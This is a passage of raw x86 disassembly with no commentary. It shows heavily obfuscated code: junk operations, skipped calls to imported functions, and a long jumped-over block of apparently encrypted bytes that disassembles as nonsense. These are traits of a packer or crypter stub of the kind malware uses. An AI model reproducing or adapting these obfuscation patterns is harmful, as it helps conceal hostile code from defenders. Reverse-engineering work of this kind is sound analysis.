  41fabc:	sbb    ecx,DWORD PTR ds:0x42828b
  41fac2:	mov    DWORD PTR ds:0x428193,ecx
  41fac8:	xor    DWORD PTR ds:0x4282db,edx
  41face:	movzx  ecx,WORD PTR ds:0x428293
  41fad5:	or     DWORD PTR ds:0x42832b,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x4283bb
  41fae3:	add    DWORD PTR ds:0x4282cf,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x4281ab
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x4281db,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x42833f
  41fb06:	mov    DWORD PTR ds:0x4283c3,edx
  41fb0c:	mov    DWORD PTR ds:0x42819f,ebx
  41fb12:	mov    DWORD PTR ds:0x428347,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x4281db,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428e7c
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x4283e3
  41fb48:	or     ecx,DWORD PTR ds:0x4282b3
  41fb4e:	mov    DWORD PTR ds:0x4283e3,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x4281ab
  41fb5a:	add    ecx,DWORD PTR ds:0x4283e3
  41fb60:	mov    DWORD PTR ds:0x4281ab,ecx
  41fb66:	sbb    DWORD PTR ds:0x4282cb,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x4282df
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42828f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x428297,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x4281cf,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x4282c7,0x4282cb
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x4283db,0x428343
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x4283af,0x0
  41fbc2:	mov    DWORD PTR ds:0x4281db,ebx
  41fbc8:	mov    DWORD PTR ds:0x4283e7,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x4282b7,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x4281b7,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x4283af,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x42811f
  41fbfd:	call   DWORD PTR ds:0x428e80
  41fc03:	and    ecx,DWORD PTR ds:0x4282a3
  41fc09:	adc    DWORD PTR ds:0x428333,ecx
  41fc0f:	sub    DWORD PTR ds:0x42833b,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x4283ab
  41fc1b:	sbb    ecx,DWORD PTR ds:0x42826b
  41fc21:	mov    DWORD PTR ds:0x4283ab,ecx
  41fc27:	and    DWORD PTR ds:0x428353,0x55d2
  41fc31:	add    DWORD PTR ds:0x4281cf,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x4282bf,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x4282cf
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x42819b
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x4282b7,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x42826f,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x4282d3,ebx
  41fc7a:	mov    DWORD PTR ds:0x4282e7,0x2746
  41fc84:	mov    DWORD PTR ds:0x4282b7,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x4281ab,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x42826f,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428ef4
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x4283e3
  41fcc1:	and    DWORD PTR ds:0x4281ab,0x42835f
  41fccb:	mov    ecx,DWORD PTR ds:0x4281b3
  41fcd1:	xor    DWORD PTR ds:0x42827f,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x4282c7
  41fcde:	sub    DWORD PTR ds:0x4283d3,ecx
  41fce4:	mov    DWORD PTR ds:0x428283,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x4283e7
  41fd0b:	add    eax,DWORD PTR ds:0x4281af
  41fd11:	mov    ds:0x4283e7,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x428353,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x42833b
  41fd39:	mov    ecx,DWORD PTR ds:0x4283cb
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x42826b
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x428353,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e84
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x4282b3,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42828f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x4282f3
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x4282df,ecx
  41fd92:	sbb    DWORD PTR ds:0x4283d3,0x42835b
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x42834f,0x428353
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x4281bf,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x4283af
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x4283af
  41fe15:	xor    DWORD PTR ds:0x4283b7,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x4281af,0x0
  41fe51:	not    DWORD PTR ds:0x4282db
  41fe57:	mov    DWORD PTR ds:0x428277,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x4281af,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e88
  41fe7d:	and    DWORD PTR ds:0x4283c7,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x42827f
  41fe8d:	movzx  ecx,WORD PTR ds:0x428357
  41fe94:	and    DWORD PTR ds:0x428333,ecx
  41fe9a:	and    DWORD PTR ds:0x4282a7,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x4281eb
  41feab:	mov    ecx,DWORD PTR ds:0x42841f
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x4281cf
  41fed3:	or     DWORD PTR ds:0x4283e3,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x4282ab,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x4283af,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x42832b,ecx
  41ff06:	cmp    DWORD PTR ds:0x4282ab,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x428193
  41ff18:	call   DWORD PTR ds:0x428ef8
  41ff1e:	or     ecx,DWORD PTR ds:0x4281b3
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x428357,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x42827b,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0x8a
  41ff55:	jbe    0x41ff9a
  41ff57:	push   0x23
  41ff59:	and    edx,DWORD PTR [esi]
  41ff5b:	sbb    BYTE PTR [ebx-0x49e7e7ee],ah
  41ff61:	data16 (bad) 
  41ff63:	es sbb dl,cl
  41ff66:	or     al,0x8c
  41ff68:	stos   DWORD PTR es:[edi],eax
  41ff69:	dec    esp
  41ff6a:	aad    0x5d
  41ff6c:	dec    edi
  41ff6d:	sbb    al,0xec
  41ff6f:	imul   edx,DWORD PTR [eax+eax*2-0xd169161],0x6e
  41ff77:	test   al,0x7a
  41ff79:	push   edx
  41ff7a:	dec    ebp
  41ff7b:	jmp    0x9f39:0xf8121c5
  41ff82:	sbb    dl,ah
  41ff84:	add    BYTE PTR [esi-0x56],dl
  41ff87:	cmp    BYTE PTR [edi+0x1a],cl
  41ff8a:	mov    ebx,0xf3a55716
  41ff8f:	or     al,BYTE PTR ds:0x65978030
  41ff95:	sbb    al,0x99
  41ff97:	cwde   
  41ff98:	push   ss
  41ff99:	in     eax,dx
  41ff9a:	(bad)  
  41ff9b:	jecxz  0x420015
  41ff9d:	or     edi,ebp
  41ff9f:	push   0xffffff96
  41ffa1:	mov    cl,0xad
  41ffa3:	sbb    DWORD PTR [ecx],eax
  41ffa5:	jge    0x420020
  41ffa7:	mov    edi,0x7b92e61d
  41ffac:	in     al,0x56
  41ffae:	xchg   ebx,eax
  41ffaf:	lds    ebp,FWORD PTR [edi+0x48aeddaa]
  41ffb5:	sbb    esi,DWORD PTR [esi]
  41ffb7:	pop    esp
  41ffb8:	inc    edi
  41ffb9:	mov    eax,0x7d90758f
  41ffbe:	xor    al,0x5d
  41ffc0:	jl     0x41ff6d
  41ffc2:	adc    eax,0x8b8643fb
  41ffc7:	imul   ebp,DWORD PTR [edx-0x2d939b89],0x480a47a3
  41ffd1:	cld    
  41ffd2:	mov    DWORD PTR [ebx],esi
  41ffd4:	xchg   ebx,eax
  41ffd5:	mov    ebx,0x14795a13
  41ffda:	pop    edi
  41ffdb:	idiv   esi
  41ffdd:	jecxz  0x41ffb1
  41ffdf:	inc    esi
  41ffe0:	popa   
  41ffe1:	jmp    0xabb1:0x1af01d7a
  41ffe8:	adc    al,0x55
  41ffea:	pop    esp
  41ffeb:	je     0x41fff1
  41ffed:	adc    al,0xe7
  41ffef:	push   edx
  41fff0:	add    BYTE PTR ds:0x997d339e,ch
  41fff6:	pop    ebp
  41fff7:	scas   al,BYTE PTR es:[edi]
  41fff8:	sahf   
  41fff9:	and    al,BYTE PTR ds:0x79288491
  41ffff:	push   ds
  420000:	and    DWORD PTR [ecx-0x27],0xa
  420004:	lods   al,BYTE PTR ds:[esi]
  420005:	fcom   DWORD PTR [eax+0x68d2dd58]
  42000b:	xchg   esi,eax
  42000c:	repnz fst st(0)
  42000f:	repnz push 0x21
  420012:	mov    bh,0x5f
  420014:	or     al,0xcb
  420016:	retf   
  420017:	shl    BYTE PTR [eax+eiz*1-0x27],1
  42001b:	ins    DWORD PTR es:[edi],dx
  42001c:	scas   eax,DWORD PTR es:[edi]
  42001d:	(bad)  
  42001e:	hlt    
  42001f:	xor    eax,0x95adf84
  420024:	push   ss
  420025:	inc    ebp
  420026:	pop    eax
  420027:	(bad)  
  420028:	in     eax,dx
  420029:	or     bl,BYTE PTR [eax]
  42002b:	pusha  
  42002c:	push   ebx
  42002d:	and    bl,bh
  42002f:	cmp    BYTE PTR [edx],dh
  420031:	in     eax,dx
  420032:	pop    edx
  420033:	jg     0x420061
  420035:	fcom   DWORD PTR [edx+ecx*1+0x33304afc]
  42003c:	lea    ebp,[esi+eiz*2]
  42003f:	jno    0x42004b
  420041:	mov    BYTE PTR [edx+0x50],0xe2
  420045:	dec    eax
  420046:	or     al,0x2c
  420048:	iret   
  420049:	jne    0x42007e
  42004b:	cld    
  42004c:	jbe    0x420029
  42004e:	data16 lahf 
  420050:	cmp    DWORD PTR [ebp-0x1e],0x7dfd5c4
  420057:	xor    DWORD PTR ds:0xd3d713c1,esi
  42005d:	setl   BYTE PTR [esi]
  420060:	mov    al,0x68
  420062:	and    ecx,DWORD PTR [eax-0x2b83e3cf]
  420068:	xor    eax,0xe63bc249
  42006d:	icebp  
  42006e:	add    DWORD PTR [edi],0x7a05a9c2
  420074:	push   ds
  420075:	test   DWORD PTR [ecx],ebx
  420077:	aas    
  420078:	enter  0xb997,0x8
  42007c:	sbb    BYTE PTR [edx],0xde
  42007f:	das    
  420080:	cli    
  420081:	pop    edx
  420082:	ror    DWORD PTR [ecx+0x5a],cl
  420085:	dec    edx
  420086:	mov    esi,DWORD PTR [edx-0x3e]
  420089:	adc    BYTE PTR [edx],bl
  42008b:	mov    WORD PTR [esi+0x19fb014f],es
  420091:	and    eax,0x1ab29a97
  420096:	adc    edi,DWORD PTR [eax+0x12a85683]
  42009c:	inc    esi
  42009d:	sbb    al,0x1b
  42009f:	in     eax,0xe
  4200a1:	lods   eax,DWORD PTR ds:[esi]
  4200a2:	mov    ch,0xc7
  4200a4:	add    cl,BYTE PTR [ebx-0x4b2921c5]
  4200aa:	pop    ecx
  4200ab:	and    esp,DWORD PTR [eax-0x21]
  4200ae:	add    BYTE PTR ds:0x8b5849ec,dl
  4200b4:	fsubr  QWORD PTR [edx+0x16]
  4200b7:	pop    ebp
  4200b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200b9:	add    ah,BYTE PTR [esi-0x1d7d5171]
  4200bf:	call   0x38880931
  4200c4:	sub    al,0x6a
  4200c6:	jne    0x4200a6
  4200c8:	ds mov esp,0x8cc861f1
  4200ce:	jl     0x42006d
  4200d0:	outs   dx,DWORD PTR ds:[esi]
  4200d1:	into   
  4200d2:	add    edi,ebp
  4200d4:	mov    al,0xeb
  4200d6:	shl    BYTE PTR [edx+eax*8+0x7ff171b3],1
  4200dd:	adc    eax,0xe6da12a7
  4200e2:	fild   DWORD PTR ds:0x33f34056
  4200e8:	shr    BYTE PTR [esp+edi*2],cl
  4200eb:	inc    esp
  4200ec:	adc    dl,BYTE PTR [edx]
  4200ee:	test   eax,0x3ec24ace
  4200f3:	and    eax,0xef1927a4
  4200f8:	(bad)  
  4200fa:	loope  0x4200ed
  4200fc:	cli    
  4200fd:	in     eax,dx
  4200fe:	inc    ebx
  4200ff:	cli    
  420100:	jecxz  0x4200a8
  420102:	inc    edi
  420103:	repnz xor DWORD PTR [edi],esp
  420106:	adc    BYTE PTR [ebp+0x767b278d],cl
  42010c:	or     DWORD PTR [ebp-0x73],ebx
  42010f:	inc    esp
  420110:	xchg   ecx,eax
  420111:	sub    DWORD PTR [eax+0x47],edi
  420114:	dec    eax
  420115:	pop    esi
  420116:	inc    edi
  420117:	xchg   DWORD PTR [edi-0x2be5ea3c],ebp
  42011d:	xchg   DWORD PTR [esi+eiz*4+0x987223b],esp
  420124:	loop   0x4200b0
  420126:	mov    esp,0x515716a3
  42012b:	inc    ecx
  42012c:	or     DWORD PTR [edi+0x77],esp
  42012f:	test   eax,0x46387c9a
  420134:	pop    ebx
  420135:	fnstsw WORD PTR [eax]
  420137:	mov    al,0xf7
  420139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42013a:	fdiv   QWORD PTR [ebx]
  42013d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42013e:	xchg   ecx,eax
  42013f:	fcom   QWORD PTR [edi-0x3e]
  420142:	or     BYTE PTR [edx],bl
  420144:	or     al,0x6e
  420146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420147:	push   ebp
  420148:	sub    al,BYTE PTR [esi+0x41]
  42014b:	cmp    ebx,ebx
  42014d:	aaa    
  42014e:	xchg   esi,eax
  42014f:	cwde   
  420150:	sbb    edi,DWORD PTR [ebx+0x25]
  420153:	cli    
  420154:	fimul  WORD PTR [edx-0xa]
  420157:	cmp    al,0xa6
  420159:	int3   
  42015a:	and    al,0x98
  42015c:	or     al,0x63
  42015e:	fistp  DWORD PTR [ecx+0x52]
  420161:	xchg   edi,ecx
  420163:	pop    ebp
  420164:	pop    eax
  420165:	into   
  420166:	adc    eax,0xcb3cd51d
  42016b:	push   edi
  42016c:	test   BYTE PTR [edi-0x4f47b753],al
  420172:	add    dh,ah
  420174:	pop    eax
  420175:	cwde   
  420176:	arpl   WORD PTR [esp+esi*1],di
  420179:	mov    edx,0xb207ca9
  42017e:	mov    ?,WORD PTR ds:0x335afe
  420184:	xor    bl,BYTE PTR [ecx]
  420186:	and    DWORD PTR [esi+0x18],edi
  420189:	sbb    ch,BYTE PTR [eax-0x36b83f65]
  42018f:	add    al,0x7e
  420191:	ja     0x42019d
  420193:	outs   dx,DWORD PTR ds:[esi]
  420194:	mov    dh,0x8e
  420196:	in     eax,dx
  420197:	inc    eax
  420198:	pop    ebp
  420199:	ret    
  42019a:	push   es
  42019b:	cmp    DWORD PTR [ebp+eax*8+0x61],eax
  42019f:	add    DWORD PTR [edx],ebx
  4201a1:	pop    edi
  4201a2:	icebp  
  4201a3:	jge    0x42020a
  4201a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201a6:	nop
  4201a7:	jnp    0x420175
  4201a9:	sbb    al,bl
  4201ab:	cmp    BYTE PTR [eax],al
  4201ad:	mov    ds:0x58734775,eax
  4201b2:	mov    dh,0xe9
  4201b4:	arpl   WORD PTR [ebx+0x2fc938e4],dx
  4201ba:	or     BYTE PTR [edi+0x69d904cd],ah
  4201c0:	nop
  4201c1:	das    
  4201c2:	cmp    DWORD PTR [edi],eax
  4201c4:	push   ebp
  4201c5:	jo     0x420179
  4201c7:	push   ss
  4201c8:	fwait
  4201c9:	adc    DWORD PTR [ebx-0x60ae6d3a],esp
  4201cf:	sub    eax,0x29b93d22
  4201d4:	jno    0x42020b
  4201d6:	cli    
  4201d7:	fisub  DWORD PTR [ebp-0x580c3a92]
  4201dd:	push   esp
  4201de:	into   
  4201df:	sbb    ch,BYTE PTR [esi-0x1f]
  4201e2:	into   
  4201e3:	ss push esp
  4201e5:	push   0xffffffd5
  4201e7:	fidivr WORD PTR ds:0x581a8fb1
  4201ed:	fsubr  DWORD PTR [esi-0x7c7e0647]
  4201f3:	mov    dl,0xa4
  4201f5:	stos   BYTE PTR es:[edi],al
  4201f6:	and    eax,0xe44da5ea
  4201fb:	jl     0x420210
  4201fd:	dec    esi
  4201fe:	std    
  4201ff:	mul    DWORD PTR [edx]
  420201:	sbb    DWORD PTR [eax-0x45c811a5],ebx
  420207:	adc    eax,0xabcca671
  42020c:	cdq    
  42020d:	mov    WORD PTR [edi+0x23],ss
  420210:	fs add ebp,ebp
  420213:	and    al,0x38
  420215:	ror    ch,0xd6
  420218:	push   ebx
  420219:	jmp    0xe0e8e89d
  42021e:	sahf   
  42021f:	(bad)
  420222:	icebp  
  420223:	outs   dx,BYTE PTR ds:[esi]
  420224:	cmp    eax,0x232b8ceb
  420229:	test   eax,0x1964a78e
  42022e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420230:	add    dh,BYTE PTR [edi+0x3f]
  420233:	ret    
  420234:	push   eax
  420235:	(bad)
  420239:	xchg   ebx,eax
  42023a:	inc    esi
  42023b:	cwde   
  42023c:	inc    esi
  42023d:	repnz push esp
  42023f:	push   cs
  420240:	loopne 0x420218
  420242:	sub    al,0x37
  420244:	clc    
  420245:	rcr    DWORD PTR [edx-0xc],cl
  420248:	stos   BYTE PTR es:[edi],al
  420249:	lds    edi,FWORD PTR [edx+0x5]
  42024c:	inc    esi
  42024d:	or     eax,0xf3c84629
  420252:	in     eax,dx
  420253:	mov    esi,0xf0d26df5
  420258:	sub    eax,0x4cea44a7
  42025d:	clc    
  42025e:	lods   eax,DWORD PTR ds:[esi]
  42025f:	pop    edi
  420260:	repz mov esi,0xc04e3eb7
  420266:	fist   DWORD PTR [ebx-0x5d2a5ce0]
  42026c:	imul   ecx,DWORD PTR [esi+eax*8],0x969978f9
  420273:	push   0x291a46bd
  420278:	add    eax,0x5a0612b8
  42027d:	loope  0x4202be
  42027f:	xor    DWORD PTR [edx],esi
  420281:	dec    ebx
  420282:	mov    ch,0x34
  420284:	adc    ch,BYTE PTR [edi+0x37a79c1e]
  42028a:	mov    cl,0x3f
  42028c:	test   BYTE PTR [ebx],0xe7
  42028f:	data16 lock shl BYTE PTR [esi-0x72],cl
  420294:	lock mov edx,0xf77f958f
  42029a:	mov    gs,edx
  42029c:	sahf   
  42029d:	jl     0x420241
  42029f:	mov    ecx,DWORD PTR [ebp-0x114]
  4202a5:	or     DWORD PTR ds:0x4282cf,0x42834b
  4202af:	sub    eax,ecx
  4202b1:	mov    ecx,DWORD PTR ds:0x4283c7
  4202b7:	add    DWORD PTR ds:0x42834f,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x4283cb,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x4281a7,0x4282c7
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x4283bb,0x42819f
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x4282b3,0x42826b
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x42834b,0x0
  42030c:	mov    DWORD PTR ds:0x4282a3,edx
  420312:	mov    esi,DWORD PTR ds:0x42826b
  420318:	mov    DWORD PTR ds:0x428347,ebx
  42031e:	mov    DWORD PTR ds:0x428357,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x4281c3,0x3019
  420337:	not    DWORD PTR ds:0x42834b
  42033d:	cmp    DWORD PTR ds:0x42834b,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x4283ab
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428efc
  420363:	adc    ecx,DWORD PTR ds:0x428283
  420369:	xor    DWORD PTR ds:0x42833f,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x42825b
  420377:	mov    esi,DWORD PTR ds:0x428313
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x4281c7,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x42833b,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x4283b7,0x0
  4203b4:	mov    DWORD PTR ds:0x4282df,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x4281db
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x42829f,0x2dc
  4203d5:	mov    DWORD PTR ds:0x42829b,edi
  4203db:	cmp    DWORD PTR ds:0x4283b7,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x42802f
  4203ed:	call   DWORD PTR ds:0x428f00
  4203f3:	movzx  esi,WORD PTR ds:0x4281b7
  4203fa:	add    DWORD PTR ds:0x428337,esi
  420400:	adc    DWORD PTR ds:0x4281d7,ebx
  420406:	add    DWORD PTR ds:0x4283b3,0x22a2
  420410:	and    esi,DWORD PTR ds:0x4283b3
  420416:	or     DWORD PTR ds:0x4283af,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x428333
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x4282b3,0x0
  42042e:	mov    DWORD PTR ds:0x4283b3,0x5615
  420438:	mov    DWORD PTR ds:0x4281ab,0x419b
  420442:	mov    DWORD PTR ds:0x4281cf,0x389d
  42044c:	not    DWORD PTR ds:0x4282a3
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x4282b3,0x0
  420463:	je     0x4204a0
  420469:	push   0x42827f
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428f04
  420477:	sub    DWORD PTR ds:0x428337,0x6950
  420481:	movzx  esi,WORD PTR ds:0x4282ab
  420488:	xor    esi,DWORD PTR ds:0x42835b
  42048e:	mov    DWORD PTR ds:0x4282ab,esi
  420494:	mov    esi,DWORD PTR ds:0x428293
  42049a:	or     DWORD PTR ds:0x42832f,esi
  4204a0:	xor    DWORD PTR ds:0x42835f,ecx
  4204a6:	add    DWORD PTR ds:0x42835f,ebx
  4204ac:	or     DWORD PTR ds:0x4283b7,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x4281cb,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x4281af,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x4283e7,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x4281cb,0x0
  420500:	mov    DWORD PTR ds:0x428333,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x4282cf
  42051b:	cmp    DWORD PTR ds:0x4281cb,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428f08
  420543:	mov    esi,DWORD PTR ds:0x4281bb
  420549:	sbb    DWORD PTR ds:0x4281d7,esi
  42054f:	and    DWORD PTR ds:0x4282d3,edx
  420555:	sbb    DWORD PTR ds:0x428287,edx
  42055b:	mov    esi,DWORD PTR ds:0x4283bf
  420561:	or     DWORD PTR ds:0x4283c3,esi
  420567:	mov    esi,DWORD PTR ds:0x4281e7
  42056d:	mov    edx,DWORD PTR ds:0x42837f
  420573:	sub    esi,edx
  420575:	and    esi,DWORD PTR [esi+edx*1]
  420578:	adc    DWORD PTR ds:0x4283bf,edx
  42057e:	mov    DWORD PTR [ebp-0xdc],0x699c
  420588:	mov    DWORD PTR [ebp-0xd8],0x1
  420592:	adc    esi,eax
  420594:	mov    DWORD PTR [ebp-0x24],0x7901
  42059b:	cmp    DWORD PTR ds:0x4281b3,0x0
  4205a2:	not    esi
  4205a4:	mov    DWORD PTR ds:0x4283d7,0x3e17
  4205ae:	jmp    0x420635
  4205b3:	mov    DWORD PTR ds:0x428273,0x2222
  4205bd:	not    DWORD PTR ds:0x428283
